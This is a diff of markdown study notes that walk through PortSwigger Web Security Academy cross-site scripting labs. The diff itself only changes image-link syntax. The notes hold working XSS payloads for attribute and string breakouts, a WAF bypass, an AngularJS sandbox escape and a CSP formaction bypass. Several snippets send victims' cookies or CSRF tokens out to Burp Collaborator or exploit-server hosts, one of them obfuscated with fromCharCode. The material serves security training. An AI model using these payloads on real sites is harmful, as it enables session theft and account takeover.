@@ -3,11 +3,11 @@
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.
 
 1. Enter a simple XSS payload > right click > Inspect > right click on the payload > Edit as HTML > notice `&lt;` and `&gt;` which means the angle brackets are HTML encoded.
-	1. ![XSS-20260126213400819](XSS-20260126213400819.png)
+	1. ![[XSS-20260126213400819.png]]
 2. Notice that your input is within double quotes `"`. When you search your input there will be 2 results, check the 2nd one (the one in the input tag). **We can break out of those quotes**.
-	1. ![XSS-20260126212729487](XSS-20260126212729487.png)
+	1. ![[XSS-20260126212729487.png]]
 3. Enter the following payload to break out of the quotes and solve.
-	1. ![XSS-20260126213319681](XSS-20260126213319681.png)
+	1. ![[XSS-20260126213319681.png]]
 
 >[!tip] No User Interaction Required
 > #Useful The `onmouseover` attribute require additional user interaction but this fires automatically: `" autofocus onfocus=alert(1) x="`
@@ -24,9 +24,9 @@ This lab contains a reflected cross-site scripting vulnerability in the search b
 #### 1.x. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded ⭕️
 This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
 1. Enter something arbitrary `test123` in search bar and notice the input is inside a JavaScript string
-	1. ![XSS-20260126214919037](XSS-20260126214919037.png)
+	1. ![[XSS-20260126214919037.png]]
 2. #Useful Enter this payload to solve: `'-alert(1)-'`. Notice the single quote to break out of the string but for 
-	1. ![XSS-20260126215313629](XSS-20260126215313629.png)
+	1. ![[XSS-20260126215313629.png]]
 
 >[!info] Why `'alert(1)` Doesn't Work
 >Without dashes `-`, payload is interpreted as a *string literal* and not JS code. Wrapping payloads with `-`, `+`, or `||` like `'||alert(1)||'` will interpret as JS code and will execute.
@@ -54,17 +54,17 @@ To solve the lab, perform a cross-site scripting attack that bypasses the WAF an
 > This lab help us learn to identify which tags are allowed by the WAF. So we can use others to exploit XSS.
 
 1. Input a basic xss payload in the search bar: `<img src=1 onerror=alert(document.cookie)>` and got an error "Tag is not allowed".
-	1. ![XSS-20260105204153035](XSS-20260105204153035.png)
+	1. ![[XSS-20260105204153035.png]]
 2. Send the search GET request to Intruder, replace the `search=` value to just `<>` and click the Add button twice to get this:
-	1. ![XSS-20260105204347663](XSS-20260105204347663.png)
+	1. ![[XSS-20260105204347663.png]]
 3. Go to the [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), click **Copy tags to clipboard**, and paste it in Intruder's payload configuration
-	1. ![XSS-20260105204527256](XSS-20260105204527256.png)
+	1. ![[XSS-20260105204527256.png]]
 	2. Start attack, when done sort by Status Code, and got 200 OK for `body` and `custom tags`.
-		1. ![XSS-20260105204700433](XSS-20260105204700433.png)
+		1. ![[XSS-20260105204700433.png]]
 4. Change the position to this: `search=<body%20$$=1>`
-	1. ![XSS-20260105204825551](XSS-20260105204825551.png)
+	1. ![[XSS-20260105204825551.png]]
 	2. On the PortSwigger cheat sheet click **Copy events to clipboard**, in Intruder clear payloads and paste. Start attack and will see all the events that the app allows which we can use in our XSS payload.
-		1.  ![XSS-20260105205347565](XSS-20260105205347565.png)
+		1.  ![[XSS-20260105205347565.png]]
 5. Click Go to exploit server and in the Body enter the following:
 ```
 <iframe src="https://0a800003030280359afcb34d005400fa.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
@@ -88,11 +88,11 @@ To solve the lab, perform a cross-site scripting attack that calls the `alert()
 
 1. Repeat Steps 1-3 from Lab 1.
 	1. These 4 tags are allowed
-	2. ![XSS-20260105211123057](XSS-20260105211123057.png)
+	2. ![[XSS-20260105211123057.png]]
 2. Modify the position, clear payload, paste in events from the cheat sheet and start attack
 	1. `<svg><animatetransform%20§§=1>`
 	2. The `onbegin` event is allowed
-	3. ![XSS-20260105211406448](XSS-20260105211406448.png)
+	3. ![[XSS-20260105211406448.png]]
 3. Enter the following in the URL and solved: `https://0a4e000b0462559081e0d95d00f300e8.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`
 
 #ExamTip Use the following payload to grab the victim's session cookie. Use Inspector to URL encode special characters.
@@ -139,7 +139,7 @@ To solve the lab, perform a cross-site scripting attack that injects a custom ta
 
 1. Repeating the Copy tags to clipboard should yield all 400 status codes as none of the tags is allowed.
 2. But a custom tag like `<xss+id=x>#x';` will get you a 200 OK.
-	1. ![XSS-20260105213220115](XSS-20260105213220115.png)
+	1. ![[XSS-20260105213220115.png]]
 3. Go to exploit server, store, and deliver the following payload to victim to solve: 
 ```
 <script>
@@ -167,13 +167,13 @@ This lab contains a reflected cross-site scripting vulnerability in the search q
 To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
 
 1. Enter something like `test'payload` into the search bar and in the response see that the single quote is escaped with a `\`
-	1. ![XSS-20260106141822668](XSS-20260106141822668.png)
-	2. ![XSS-20260106141833547](XSS-20260106141833547.png)
+	1. ![[XSS-20260106141822668.png]]
+	2. ![[XSS-20260106141833547.png]]
 2. Simply add `</script>` before your XSS payload to have it execute
 	1. `</script><script>alert(1)</script>`
-	2. ![XSS-20260106142008128](XSS-20260106142008128.png)
-	3. ![XSS-20260106142232856](XSS-20260106142232856.png)
-	4. ![306](XSS-20260106142049361.png)
+	2. ![[XSS-20260106142008128.png]]
+	3. ![[XSS-20260106142232856.png]]
+	4. ![[XSS-20260106142049361.png|306]]
 
 #ExamTip 
 > When placing this payload in `iframe`, the target application do not allow it to be embedded and give message: `refused to connect`.
@@ -221,11 +221,11 @@ To solve this lab, perform a cross-site scripting attack that breaks out of the 
 https://youtu.be/Aqfl2Rj0qlU?t=598
 
 1. Sending a payload with a single quote `'` gets escaped with a `\` which prevents the input to be escaped. 
-	1. ![XSS-20260106143234365](XSS-20260106143234365.png)
+	1. ![[XSS-20260106143234365.png]]
 2. But enter `test\payload` and notice that it doesn't get escaped
-	1. ![XSS-20260106143315929](XSS-20260106143315929.png)
+	1. ![[XSS-20260106143315929.png]]
 3. Use any of the payloads below to break out of the `searchTerms` string and have the JS execute
-	1. ![XSS-20260106143506309](XSS-20260106143506309.png)
+	1. ![[XSS-20260106143506309.png]]
 	2. The semicolon like in `fuzzer\';console.log(12345);//` seems to indicate the end of a line in JS so you can run a new JS function which is `console.log` in this case.
 #ExamTip 
 Use these to test
@@ -254,16 +254,16 @@ This lab uses AngularJS in an unusual way where the `$eval` function is not av
 To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.
 
 1. Entered `test'payload` in the search bar and notice in the AngularJS code that our payload was escaped and is the value for the `search` key.
-	1. ![XSS-20260106145307991](XSS-20260106145307991.png)
+	1. ![[XSS-20260106145307991.png]]
 2. Now enter `/?search=value1&key2=value2` **in the URL** and see that it dynamically created another key `key2` and the value `value2`.
-	1. ![XSS-20260106145147733](XSS-20260106145147733.png)
+	1. ![[XSS-20260106145147733.png]]
 	2. Can't do this in the search bar because it won't process it correctly:
-		1. ![XSS-20260106145542488](XSS-20260106145542488.png)
+		1. ![[XSS-20260106145542488.png]]
 3. Enter this `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` in the URL `search=` to solve the lab
-	1. ![306](XSS-20260106150621258.png)
+	1. ![[XSS-20260106150621258.png|306]]
 	2. Using an ASCII to Text converter will show that the JS function that was executed was `alert(1)` 
-		1. ![XSS-20260106150840094](XSS-20260106150840094.png)
-	3. ![315](XSS-20260106150608454.png)
+		1. ![[XSS-20260106150840094.png]]
+	3. ![[XSS-20260106150608454.png|315]]
 ##### Why does this work?
 1. The exploit uses `toString()` to create a string without using quotes.
 2. Then gets the String prototype and overwrites the `charAt` function for every string.
@@ -299,7 +299,7 @@ output = ",".join(ascii_values)
 print(output)
 print('PortSwigger Expert Academy Labs!')
 ```
-![XSS-20260106151011594](XSS-20260106151011594.png)
+![[XSS-20260106151011594.png]]
 
 How to convert
 ```
@@ -324,9 +324,9 @@ x=fetch('https://3jnux03mnj2q2ochh2b7ez74evkm8mwb.oastify.com/?z='+document.cook
 This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.
 
 1. Enter a random string to observe the JS and notice that the `message` variable enclose the input with backticks. This is an **template literal**.
-	1. ![XSS-20260106151707709](XSS-20260106151707709.png)
+	1. ![[XSS-20260106151707709.png]]
 2. Use this payload to solve `${alert(document.cookie)}`
-	1. ![XSS-20260106151915009](XSS-20260106151915009.png)
+	1. ![[XSS-20260106151915009.png]]
 
 #ExamTip 
 Payload to grab session cookie
@@ -334,19 +334,19 @@ Payload to grab session cookie
 ${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}
 ```
 > The values inside `fromCharCode` are hexadecimal values
-![XSS-20260106152525038](XSS-20260106152525038.png)
+![[XSS-20260106152525038.png]]
 > In order to easily convert our Burp Collaborator URL into hex use CyberChef > To Hex > Delimiter: 0x with comma and Bytes per line: 0
-> ![XSS-20260106152810396](XSS-20260106152810396.png)
+> ![[XSS-20260106152810396.png]]
 
 >[!Tip] Proof of Concept 
 >This is a PoC to show that the payload can grab cookies. **BUT you'd have to deliver this exploit to the victim**. This PoC only shows your own cookie.
 >1. Create a dummy cookie in the browser 
->	1. ![XSS-20260106154019536](XSS-20260106154019536.png)
+>	1. ![[XSS-20260106154019536.png]]
 >2. Get your Burp Collaborator link, put it in CyberChef, and put that in the payload.
->	1.![520](XSS-20260106154120650.png)
->	2.![XSS-20260106154147351](XSS-20260106154147351.png)
+>	1.![[XSS-20260106154120650.png|520]]
+>	2.![[XSS-20260106154147351.png]]
 >3. Paste it in the search bar and click Poll now in Burp Collaborator and we got the cookie. **Again, this PoC only show YOUR cookie, for the exam, send the full URL with the payload or "host" an iframe to the victim, they click on the link and then we'd have their cookie!**
->	1. ![XSS-20260106154234218](XSS-20260106154234218.png)
+>	1. ![[XSS-20260106154234218.png]]
 
 **Deliver to victim**
 ```
@@ -371,13 +371,13 @@ To assist with your exploit, you can assume that the simulated user will press t
 - `Alt+X`
 Please note that the intended solution to this lab is only possible in Chrome.
 1. Notice there are no obvious input fields like a search bar for reflected XSS. Notice `canonical` when you search for it in the response.
-	1. ![XSS-20260127162323018](XSS-20260127162323018.png)
+	1. ![[XSS-20260127162323018.png]]
 2. Enter something arbitrary in the URL like `?test123` and notice it is reflected in the response.
-	1. ![XSS-20260127162428328](XSS-20260127162428328.png)
+	1. ![[XSS-20260127162428328.png]]
 3. Break out of the link tag with `'onclick='alert(1)`. The trailing single quote was added by the app.
-	1. ![XSS-20260127163132289](XSS-20260127163132289.png)
+	1. ![[XSS-20260127163132289.png]]
 4. We need the `accesskey` attribute to solve this lab. 
-	1. ![XSS-20260127163235011](XSS-20260127163235011.png)
+	1. ![[XSS-20260127163235011.png]]
 	2. In the URL it will look like this: `?%27accesskey=%27x%27onclick=%27alert(1)`
 >The alert won't trigger until the user press those combinations up top.
 
@@ -402,29 +402,29 @@ You must label your vector with the word "Click" in order to induce the simulate
 
 You can log in to your own account using the following credentials: `wiener:peter`
 1. Login and notice the app has a CSP header + `csrf` token in the response
-	1. ![XSS-20260127201549042](XSS-20260127201549042.png)
-	2. ![XSS-20260127201624487](XSS-20260127201624487.png)
+	1. ![[XSS-20260127201549042.png]]
+	2. ![[XSS-20260127201624487.png]]
 2. Update email feature has client side validation
-	1. ![XSS-20260127201927778](XSS-20260127201927778.png)
+	1. ![[XSS-20260127201927778.png]]
 3. Bypass client-side validation:
 	1. Right click > Inspect on email field > right click Edit as HTML > change `type="email"` to `type="text"`. 
-		1. ![XSS-20260127202242805](XSS-20260127202242805.png)
+		1. ![[XSS-20260127202242805.png]]
 	2. Enter the following payload: `foo@example.com"><img src= onerror=alert(1)>` to break out of that `<input>` tag. Notice the app properly HTML encode angle brackets. 
-		1. ![XSS-20260127202339680](XSS-20260127202339680.png)
+		1. ![[XSS-20260127202339680.png]]
 4. Enter this in the URL: `?email="><img src onerror=alert(1)>` notice that we were able to get it reflected and break out of the input tag but it didn't execute probably due to the CSP header. Console confirms CSP blocked the inline script.
-	1. ![XSS-20260127202646194](XSS-20260127202646194.png)
-	2. ![XSS-20260127202735061](XSS-20260127202735061.png)
-	3. ![XSS-20260127202823149](XSS-20260127202823149.png)
+	1. ![[XSS-20260127202646194.png]]
+	2. ![[XSS-20260127202735061.png]]
+	3. ![[XSS-20260127202823149.png]]
 5. From Step 1 notice `form-action` is missing from the CSP. **Find out why this is important**. 
 6. Enter the payload below in the URL. Replace your exploit server id. Notice the "Click Me" button rendered.
-	1. ![172](XSS-20260127203437918.png)
+	1. ![[XSS-20260127203437918.png|172]]
 ```
 /my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>
 ```
 7. Click on the button and we got redirected to the exploit server's `/exploit` endpoint. **This confirms us bypassing CSP and allow redirection of form submissions to an external server**.
-	1. ![XSS-20260127203524992](XSS-20260127203524992.png)
+	1. ![[XSS-20260127203524992.png]]
 8. Change the payload to resemble the one below. Notice `formmethod="get"`. **This will grab the victim's csrf token and put it in the URL**.
-	1. ![XSS-20260127203849594](XSS-20260127203849594.png)
+	1. ![[XSS-20260127203849594.png]]
 ```
 /my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
 ```
